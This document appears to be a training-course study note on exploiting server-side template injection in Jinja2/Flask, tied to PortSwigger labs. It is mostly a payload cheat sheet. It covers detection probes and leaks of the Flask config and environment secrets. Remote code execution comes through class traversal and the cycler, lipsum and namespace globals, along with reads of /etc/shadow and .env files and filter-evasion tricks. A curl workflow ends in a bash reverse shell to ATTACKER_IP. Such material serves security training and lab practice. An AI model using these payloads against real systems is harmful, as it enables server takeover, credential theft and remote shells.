---
tags: [vapt, ssti, advanced]
difficulty: advanced
module: "09 - SSTI"
topic: "09.04 SSTI in Jinja2 (Python/Flask)"
portswigger_labs: ["Server-side template injection with a custom template tag", "Server-side template injection using Python/Flask Jinja2"]
---

# 09.04 — SSTI in Jinja2 (Python/Flask)

## Jinja2 Template Syntax

```python
# NORMAL USAGE:
{{ variable }}           → outputs variable value
{{ 7 * 7 }}              → 49
{{ "hello" | upper }}    → HELLO
{% if condition %}...{% endif %}
{% for item in list %}...{% endfor %}

# DETECTION PAYLOAD:
{{7*7}}     → 49 = Jinja2 confirmed!
{{7*'7'}}   → 7777777 = Jinja2 (string repetition — not Twig!)
```

---

## Initial Data Leakage

```python
# READ FLASK CONFIG (database passwords, SECRET_KEY, etc.):
{{config}}
{{config.items()}}
{{config['SECRET_KEY']}}     ← JWT signing key!
{{config['SQLALCHEMY_DATABASE_URI']}}  ← database credentials!

# READ REQUEST OBJECT:
{{request}}
{{request.environ}}          ← WSGI environment variables
{{request.cookies}}          ← all cookies
{{request.headers}}          ← all HTTP request headers
{{request.args}}             ← GET parameters
{{request.form}}             ← POST parameters
{{request.url}}              ← current URL

# READ ENVIRONMENT:
{{self.__dict__}}
{{namespace.__init__.__globals__}}
```

---

## Python Class Hierarchy Traversal (The Hard Way)

```python
# JINJA2 DOESN'T ALLOW os.system() DIRECTLY
# Must walk Python's class hierarchy to find dangerous classes

# STEP 1: Start from an empty string
''.__class__                     # → str class
''.__class__.__mro__             # → MRO: [str, object]
''.__class__.__mro__[1]          # → object class (base of all Python classes!)
''.__class__.__mro__[1].__subclasses__()  # → list ALL classes!

# STEP 2: In Jinja2 template:
{{''.__class__.__mro__[1].__subclasses__()}}
# → Outputs a HUGE list of classes

# STEP 3: Find useful class (index varies by Python version/environment):
# Look for: subprocess.Popen, os._wrap_close, warnings.catch_warnings
# The Popen class allows running OS commands!

# STEP 4: Check index of specific class:
{{''.__class__.__mro__[1].__subclasses__() | list}}
# → Find "subprocess.Popen" and note its index (e.g., index 408)

# STEP 5: Use it:
{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}
# → Runs 'id' command! Returns: (b'uid=33(www-data)...\n', None)
```

---

## Finding the Right Index (Automation)

```python
# FIND POPEN INDEX:
# This Jinja2 template lists all subclasses with their index:
{{ ''.__class__.__mro__[1].__subclasses__() | map('string') | list | join('\n') }}

# FROM PYTHON (to find offline):
import subprocess
classes = ''.__class__.__mro__[1].__subclasses__()
for i, c in enumerate(classes):
    print(i, c)
# → Run locally in matching Python version to find Popen index

# COMMON INDICES (vary by Python version):
# Python 3.6:  Popen ≈ index 245
# Python 3.8:  Popen ≈ index 351
# Python 3.10: Popen ≈ index 413+
# Best approach: dump the list and search visually

# SEARCH VIA JINJA2:
{{''.__class__.__mro__[1].__subclasses__()|select('equalto','subprocess.Popen')|list}}
```

---

## RCE Payloads (Jinja2)

```python
# METHOD 1 — SUBPROCESS.POPEN (classic):
{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0]}}

# METHOD 2 — OS MODULE:
# Find the module that imports os (varies by environment):
{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('id')}}

# METHOD 3 — BUILTINS:
{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']}}
# → Shows builtins → find __import__ → import os

# METHOD 4 — OS.POPEN:
{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# METHOD 5 — CYCLER CLASS (Flask-specific shortcut!):
{{cycler.__init__.__globals__.os.popen('id').read()}}
# ↑ MUCH SIMPLER! Flask ships with cycler, joiner, namespace built-ins
# cycler has access to os module via its __globals__!

# METHOD 6 — NAMESPACE (another Flask built-in):
{{namespace.__init__.__globals__.os.popen('id').read()}}

# METHOD 7 — LIPSUM (Flask built-in):
{{lipsum.__globals__.os.popen('id').read()}}
```

---

## Short Payloads (Flask Built-in Shortcuts)

```python
# THESE WORK IN FLASK/JINJA2 WITHOUT CLASS TRAVERSAL:

# READ FILE:
{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}

# RCE:
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('whoami').read()}}
{{cycler.__init__.__globals__.os.popen('hostname').read()}}

# REVERSE SHELL:
{{cycler.__init__.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'").read()}}

# READ ENV VARS:
{{cycler.__init__.__globals__.os.environ}}
{{cycler.__init__.__globals__.os.environ.get('SECRET_KEY')}}
{{cycler.__init__.__globals__.os.environ.get('DATABASE_URL')}}
{{cycler.__init__.__globals__.os.environ.get('AWS_ACCESS_KEY_ID')}}

# LIST DIRECTORY:
{{cycler.__init__.__globals__.os.listdir('.')}}
{{cycler.__init__.__globals__.os.listdir('/var/www/html')}}
```

---

## Reading Files

```python
# READ /ETC/PASSWD:
{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}

# OPEN() BUILTIN:
{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}

# IF open() IS IN GLOBALS:
{{''.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['open']('/etc/passwd').read()}}

# COMMON SENSITIVE FILES:
{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}
{{cycler.__init__.__globals__.os.popen('cat /etc/shadow').read()}}
{{cycler.__init__.__globals__.os.popen('cat /var/www/html/.env').read()}}
{{cycler.__init__.__globals__.os.popen('cat /var/www/html/config.py').read()}}
{{cycler.__init__.__globals__.os.popen('env').read()}}
```

---

## Jinja2 Filter Bypass

```python
# IF DOUBLE BRACES {{ }} ARE FILTERED:
{%if 1==1%}SSTI{%endif%}         ← uses {% %} not {{ }}
{%with a=7*7%}{{a}}{%endwith%}   ← assign then output

# IF DOT NOTATION IS FILTERED:
{{ config['SECRET_KEY'] }}        ← bracket notation instead of config.SECRET_KEY
{{ request|attr('cookies') }}     ← attr filter instead of dot

# IF UNDERSCORE IS FILTERED:
{{''['\x5f\x5fclass\x5f\x5f']}}  ← __class__ hex encoded
{{request|attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f')}}  ← attr + hex

# IF QUOTES ARE FILTERED:
{{dict(class=1).keys()|list|first}}  ← dict key as keyword arg!
# Access string chars:
{{request.method[0]}}  ← 'G' from 'GET'
{{request.method[0]~request.method[1]}}  ← 'GE'

# USING LIPSUM FILTER:
{{lipsum()|list|first|attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f')}}
```

---

## Sandbox Bypass (Jinja2 with Sandbox)

```python
# IF SANDBOXED JINJA2 (SandboxedEnvironment):
# Most attributes/methods restricted → harder to exploit
# But some bypasses exist:

# FORMAT STRING METHOD:
"{{'{0}'.format(1)}}"             → uses str.format

# GLOBALS VIA FORMAT:
"{{'{}'\".format.__class__.__mro__[-1].__subclasses__()"
```

---

## Complete Jinja2 SSTI Exploitation Workflow

```bash
# STEP 1: CONFIRM SSTI:
curl "https://target.com/profile?name=%7B%7B7*7%7D%7D"
# Look for 49 in response

# STEP 2: CONFIRM JINJA2 (vs Twig):
curl "https://target.com/profile?name=%7B%7B7*'7'%7D%7D"
# 7777777 = Jinja2!

# STEP 3: LEAK CONFIG:
curl "https://target.com/profile?name=%7B%7Bconfig%7D%7D"
# Look for SECRET_KEY, DATABASE_URL etc.

# STEP 4: RCE — GET OS POPEN:
curl "https://target.com/profile?name=%7B%7Bcycler.__init__.__globals__.os.popen('id').read()%7D%7D"
# Should see: uid=33(www-data)...

# STEP 5: REVERSE SHELL:
curl "https://target.com/profile?name=%7B%7Bcycler.__init__.__globals__.os.popen('bash+-c+%27bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261%27').read()%7D%7D"
```

---

## Related Notes
- [[03 - Detecting SSTI]] — detection methodology
- [[08 - SSTI to RCE Escalation]] — escalation guide
- [[10 - SSTImap Tool Usage]] — automated exploitation
- [[02 - Template Engines Overview]] — other engines
- [[Module 08 - Command Injection]] — similar impact
